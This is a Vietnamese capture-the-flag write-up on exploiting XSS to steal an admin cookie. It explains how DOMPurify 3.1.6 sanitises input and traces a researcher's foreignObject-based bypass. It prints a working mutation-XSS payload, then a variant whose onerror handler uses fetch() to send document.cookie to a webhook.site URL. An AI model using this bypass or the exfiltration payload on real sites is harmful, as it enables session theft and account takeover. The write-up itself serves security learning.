Ta cần khai thác XSS và lấy được cookie của admin.
Bài này dựa vào description,ta thấy input được filter bằng DOMPurify,việc đầu tiên nghĩ đến là sẽ tìm cách 
bypass DOMPurify,tuy nhiên DOMPurify sử dụng cơ chế không dễ ăn tí nào, bằng cách dựa vào chính DOM tree để 
loại bỏ các tag và attribute không mong muốn. <br>
Nhắc lại cách hoạt động của DOMPurify, dựa vào DOM tree để loại các node và attribute không mong muốn, đối với 
một cặp thẻ `<p></p>` thì có thể gọi là node p, với một dòng text đơn thuần thì sẽ được gọi là text node, 
khác biệt ở đâu? <br>
<br>
Ví dụ ta có data `<a><h1>aaaa</h1></a>`, nếu gọi đến innerHTML của thẻ a thì data thu được sẽ là `<h1>aaaa</h1>`, 
nếu gọi đến innerText thì kết quả thu được là aaaa.<br>
Dựa vào description,ta thấy version là 3.1.6,phiên bản mới nhất là 3.1.7.Check thử release của 3.1.7 ta thấy 
thẻ `<foreignObject>` đã bị xóa,nên ta sẽ tìm thử payload liên quan đến thẻ này. <br>
Check thử X của người report lỗi (@masatokinugawa),ta thấy có post cần tìm <br>
<a>https://x.com/kinugawamasato/status/1843687909431582830 </a> <br>
![alt](https://pbs.twimg.com/media/GZYWJw_asAMZLem?format=png&name=900x900)<br>
![alt](https://pbs.twimg.com/media/GZYWOW8asAIpvLV?format=png&name=900x900) <br>
Payload : <br>
``` <a>
        <svg>
            <a>
                <foreignobject>
                <a>
                    <table>
                        <a>
                    </table>
            <style>
                <!--
            </style>
        </svg><a id="->
        <img src onerror=alert(1)>">.
    </a> 
```

Khi đã chạy được JS thì lấy cookie của admin gửi qua webhook thôi. <br>
<a>
```
    <svg>
        <a>
        <foreignobject>
        <a>
            <table>
                <a>
            </table>
        <style>
            <!--
        </style>
    </svg><a id="->
    <img src onerror=fetch('https://webhook.site/3b18e668-3ecf-484c-983f-2c36e5e91c9d?cookie='+encodeURIComponent(document.cookie))
    );>">
```
</a>